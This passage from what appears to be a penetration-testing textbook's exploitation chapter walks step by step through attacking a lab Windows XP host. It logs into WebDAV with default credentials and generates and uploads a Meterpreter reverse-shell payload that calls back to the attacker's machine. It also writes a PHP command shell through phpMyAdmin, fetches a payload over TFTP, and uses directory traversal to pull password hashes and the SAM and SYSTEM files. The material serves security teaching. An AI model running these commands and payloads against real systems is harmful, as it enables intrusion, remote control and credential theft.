[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Sending Stage to 192.168.20.10...
[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:4312) at
2015-01-12 00:11:58 -0500
Listing 8-1: Exploiting MS08-067 with a Meterpreter payload
As the output shows, running this exploit should open a Meterpreter
session that we’ll be able to use for post exploitation.
exploiting webdaV default Credentials
In Chapter 6, we found that the XAMPP installation on our Windows XP
target employs default login credentials for the WebDAV folder used to
upload files to the web server. This issue allows us to upload our own pages
to the server with Cadaver, a command line client for WebDAV, which we
used to verify this vulnerability in Chapter 6. Let’s create a simple test file
to upload:
root@kali:~# cat test.txt
test
Now use Cadaver with the credentials wampp:xampp to authenticate
with WebDAV.
root@kali:~# cadaver http://192.168.20.10/webdav
Authentication required for XAMPP with WebDAV on server `192.168.20.10':
Username: wampp
Password:
dav:/webdav/>
Finally, use WebDAV’s put command to upload our test.txt file to the web
server.
182 Chapter 8
dav:/webdav/> put test.txt
Uploading test.txt to `/webdav/test.txt':
Progress: [=============================>] 100.0% of 5 bytes succeeded.
dav:/webdav/>
If you browse to /webdav/test.txt, you should see that we have successfully
uploaded our text file to the website, as shown in Figure 8-1.
Figure 8-1: A file uploaded with WebDAV
Running a Script on the Target Web Server
A text file is not very useful to us; it would be better if we could upload a
script and execute it on the web server, allowing us to run commands on
the underlying system’s Apache web server. If Apache is installed as a system
service, it will have system-level privileges, which we could use to gain maxi-
mum control over our target. If not, Apache will run with privileges of the
user who started it. Either way, you should end up with a good deal of con-
trol over the underlying system just by dropping a file on the web server.
Let’s start by confirming that our WebDAV user is allowed to upload
scripts to the server. Because we found phpMyAdmin software on this web
server in Chapter 6, we know that the XAMPP software includes PHP. If we
upload and execute a PHP file, we should be able to run commands on the
system using PHP.
dav:/webdav/> put test.php
Uploading test.php to `/webdav/test.php':
Progress: [=============================>] 100.0% of 5 bytes succeeded.
dav:/webdav/>
note Some open WebDAV servers allow uploading text files but block script files like .asp or
.php. Lucky for us, that isn’t the case here, and we successfully uploaded test.php.
Uploading a Msfvenom Payload
In addition to uploading any PHP scripts we’ve created to perform tasks on
the target, we can also use Msfvenom to generate a stand-alone Metasploit
payload to upload to the server. We used Msfvenom briefly in Chapter 4,
but to brush up on syntax, you can enter msfvenom -h for help. When you’re
ready, list all the available payloads with the -l option for PHP payloads, as
shown in Listing 8-2.
Exploitation 183
root@kali:~# msfvenom -l payloads
php/bind_perlu Listen for a connection and spawn a command
shell via perl (persistent)
php/bind_perl_ipv6 Listen for a connection and spawn a command
shell via perl (persistent) over IPv6
php/bind_php Listen for a connection and spawn a command
shell via php
php/bind_php_ipv6 Listen for a connection and spawn a command
shell via php (IPv6)
php/download_execv Download an EXE from an HTTP URL and execute it
php/exec Execute a single system command
php/meterpreter/bind_tcpw Listen for a connection over IPv6, Run a
meterpreter server in PHP
php/meterpreter/reverse_tcp Reverse PHP connect back stager with checks
for disabled functions, Run a meterpreter
server in PHP
php/meterpreter_reverse_tcp Connect back to attacker and spawn a
Meterpreter server (PHP)
php/reverse_perl Creates an interactive shell via perl
php/reverse_php Reverse PHP connect back shell with checks
for disabled functions
php/shell_findsock
Listing 8-2: Metasploit PHP payloads
Msfvenom gives us a few options: We can download and execute a file on
the system v, create a shell u, or even use Meterpreter w. Any of these pay-
loads will give us control of the system, but let’s use php/meterpreter/reverse_tcp.
After we specify a payload, we can use -o to find out which options we need to
use with it, as shown here.
root@kali:~# msfvenom -p php/meterpreter/reverse_tcp -o
[*] Options for payload/php/meterpreter/reverse_tcp
--snip--
Name Current Setting Required Description
---- --------------- -------- -----------
LHOST yes The listen address
LPORT 4444 yes The listen port
As you can see we need to set LHOST to tell the payload which IP
address to connect back to, and we can also change the LPORT option.
Because this payload is already in PHP format, we can output it in the
raw format with the -f option after we set our options, and then pipe
the raw PHP code into a file with the .php extension for posting to the
server, as shown here.
root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.20.9
LPORT=2323 -f raw > meterpreter.php
184 Chapter 8
Now we upload the file using WebDAV.
dav:/webdav/> put meterpreter.php
Uploading meterpreter.php to `/webdav/meterpreter.php':
Progress: [=============================>] 100.0% of 1317 bytes succeeded.
As in Chapter 4, we need to set up a handler in Msfconsole to catch the
payload before we execute the script (see Listing 8-3).
msf > use multi/handler
msf exploit(handler) > set payload php/meterpreter/reverse_tcpu
payload => php/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.20.9v
lhost => 192.168.20.9
msf exploit(handler) > set LPORT 2323w
lport => 2323
msf exploit(handler) > exploit
[*] Started reverse handler on 192.168.20.9:2323
[*] Starting the payload handler...
Listing 8-3: Setting up the payload handler
Use multi/handler in Msfconsole, set the payload to php/meterpreter/
reverse_tcp u, and set LHOST v and LPORT w appropriately to match the
generated payload. If this process is unfamiliar to you, jump back to the
“Creating Standalone Payloads with Msfvenom” on page 103.
Running the uploaded payload by opening it in a web browser should
provide us with a Meterpreter session that we can see when we return to
Msfconsole, as shown here.
[*] Sending stage (39217 bytes) to 192.168.20.10
[*] Meterpreter session 2 opened (192.168.20.9:2323 -> 192.168.20.10:1301) at
2015-01-07 17:27:44 -0500
meterpreter >
We can use the Meterpreter command getuid to see what privileges our
session has on the exploited target. Generally speaking, we get the privi-
leges of the software we exploited.
meterpreter > getuid
BOOKXP\SYSTEM
We now have system privileges, which will allow us to take complete
control of the Windows system. (It’s generally a bad idea to allow web server
software to have system privileges for just this reason. Because XAMPP’s
Apache server is running as a system service, we have full access to the
underlying system.)
Now let’s look at another issue with our XAMPP install.
Exploitation 185
exploiting open phpmyadmin
The same target XAMPP platform exploited in the previous section also
includes an open phpMyAdmin install, which we can exploit to run com-
mands on the database server. Like Apache, our MySQL server will have
either system privileges (if it is installed as a Windows service) or the privi-
leges of the user that started the MySQL process. By accessing the MySQL
database, we can perform an attack similar to our WebDAV attack and
upload scripts to the web server using MySQL queries.
To explore this attack, first navigate to http://192.168.20.10/phpmyadmin,
and click the SQL tab at the top. We’ll use MySQL to write a script to the
web server that we’ll use to get a remote shell. We’ll use a SQL SELECT
statement to output a PHP script to a file on the web server, which will
allow us to remotely control the target system. We’ll use the script  to grab the cmd parameter from the URL and exe-
cute it using the system() command.
The default install location for XAMPP’s Apache on Windows is
C:\xampp\htodcs\. The syntax for our command is: SELECT ""
into outfile "path_to_file_on_web_server". Our completed command looks
like this:
SELECT "" into outfile "C:\\xampp\\htdocs\\shell.php"
note We use double backslashes to escape, so we don’t end up with the file
C:xampphtdocsshell.php, which we will not be able to access from
the web server.
Figure 8-2 shows the command entered into the SQL console in
phpMyAdmin.
Figure 8-2: Executing SQL commands
186 Chapter 8
Run the completed query in phpMyAdmin, and then browse to the
newly created file, http://192.168.20.10/shell.php. The script should throw the
error Warning: system() [function.system]: Cannot execute a blank command in C:\
xampp\htdocs\shell.php on line 1, because we did not supply an cmd parameter.
(Recall from earlier that shell.php grabs the cmd parameter from the URL
and runs it using the PHP system() command.) We need to supply a cmd
parameter that tells the script the command we’d like to run on the target
system. For example, we can ask the Windows XP target to tell us its net-
working information using ipconfig as the cmd parameter, like so:
http://192.168.20.10/shell.php?cmd=ipconfig
The result is shown in Figure 8-3.
Figure 8-3: Code execution
Downloading a File with TFTP
The previous steps give us a shell with system privileges, which we “upgrade”
by uploading a more complicated PHP script. But rather than creating a
really long and complicated SQL SELECT query, we can host a file on our
Kali machine and then use our PHP shell to pull it down to the web server.
On Linux, we could use wget to download files from the command line.
This functionality is painfully absent on Windows, but we can use TFTP on
Windows XP. Let’s use it to upload meterpreter.php from the previous section.
note TFTP is not the only way we can transfer files with noninteractive command line
access. In fact, some newer Windows systems do not have TFTP enabled by default.
You can also have FTP read settings from a file with the -s option or use a script-
ing language such as Visual Basic or Powershell on the latest Windows operating
systems.
We can use the Atftpd TFTP server to host files on our Kali system.
Start Atftpd in daemon mode, serving files from the location of your
meterpreter.php script.
root@kali:~# atftpd --daemon --bind-address 192.168.20.9 /tmp
Set the cmd parameter in the shell.php script as follows:
http://192.168.20.10/shell.php?cmd=tftp 192.168.20.9 get meterpreter.php
C:\\xampp\\htdocs\\meterpreter.php
Exploitation 187
This command should pull down meterpreter.php to the target’s Apache
directory using TFTP, as shown in Figure 8-4.
Figure 8-4: Transferring files with TFTP
Now we can browse to http://192.168.20.10/meterpreter.php to open a
Meterpreter shell. (Be sure to restart the handler to catch the Meterpreter
connection before executing the script.) And as you can see, though we
used an attack different from uploading a file through WebDAV, we ended
up in the same place: We have a Meterpreter shell from the web server
using its access to the MySQL server to upload files.
Now let’s look at attacking the other web server on the Windows XP
system.
note This is not the only way we could exploit database access. For example, if you find a
Microsoft MS SQL database instead, you may be able to use the xp_cmdshell() func-
tion, which acts as a built-in system command shell. For security reasons, it is disabled
on newer versions of MS SQL, but a user with administrative privileges should be
able to reenable it, giving you shell access without having to upload anything.
downloading sensitive Files
Recall from Chapter 6 that our Zervit server on port 3232 has a directory
traversal issue that will allow us to download files from the remote system
without authentication. We can download the Windows boot.ini configura-
tion file (and other files, too) through the browser with the following URL:
http://192.168.20.10:3232/index.html?../../../../../../boot.ini
We’ll use this ability to pull files containing password hashes (encrypted
passwords) for Windows, as well as installed services.
Downloading a Configuration File
The default install location for XAMPP is C:\xampp, so we can expect the
directory for FileZilla FTP server to be at C:\xampp\FileZillaFtp. A little
online research on FileZilla tells us that it stores MD5 hashes of passwords
in the FileZilla Server.xml configuration file. Depending on the strength of
the FTP passwords stored in this file, we may be able to use the MD5 hash
value to recover users’ plaintext FTP passwords.
We captured the password for user georgia in Chapter 7, but our target
may contain additional accounts. Let’s use the Zervit server to download
the FileZilla configuration file from http://192.168.20.10:3232/index.html?
../../../../../../xampp/FileZillaFtp/FileZilla%20Server.xml. (Note that %20 is
188 Chapter 8
hex encoding for a space.) You can see some of the contents of the file in
Listing 8-4.
5f4dcc3b5aa765d61d8327deb882cf99
0
0
0
--snip--
Listing 8-4: FileZilla FTP configuration file
As you can see, the configuration file contains two user accounts (in
the User Name fields): georgia and newuser. Now all we have to do is figure
out their passwords based on the stored hashes.
We’ll look at turning password hashes back into plaintext passwords
(including MD5 hashes) in the next chapter.
Downloading the Windows SAM
Speaking of passwords, in addition to the FTP user passwords, we can try
pulling down the Windows Security Accounts Manager (SAM) file that stores
Windows hashes. The SAM file is obfuscated because the Windows Syskey
utility encrypts the password hashes inside the SAM file with 128-bit Rivest
Cipher 4 (RC4) to provide additional security. Even if an attacker or pen-
tester is able to gain access to the SAM file, there is a bit more work to do to
recover the password hashes. We need a key to reverse the RC4 encryption
on the hashes. The encryption key for the Syskey utility, called the bootkey,
is stored inside of the Windows SYSTEM file. We need to download both
the SAM and SYSTEM files to recover the hashes and attempt to reverse
them into plaintext passwords. In Windows XP, these files are located at
C:\Windows\System32\config, so let’s try downloading the SAM file from the
following URL:
http://192.168.20.10:3232/index.html?../../../../../../WINDOWS/system32/config/sam
When we try to use Zervit to download this file, we get a “file not
found” error. It looks like our Zervit server doesn’t have access to this file.
Luckily, Windows XP backs up both the SAM and SYSTEM files to the
C:\Windows\repair directory, and if we try to pull down the files from there,
Zervit is able to serve them. These URLs should do the trick:
http://192.168.20.10:3232/index.html?../../../../../../WINDOWS/repair/system
http://192.168.20.10:3232/index.html?../../../../../../WINDOWS/repair/sam
note Like our MD5 hashes, we’ll use the Windows SAM file in the next chapter when we
cover password attacks in depth.
Exploitation 189
exploiting a Buffer overflow in third-Party software
In Chapter 6, we never did find out for sure if the SLMail server on our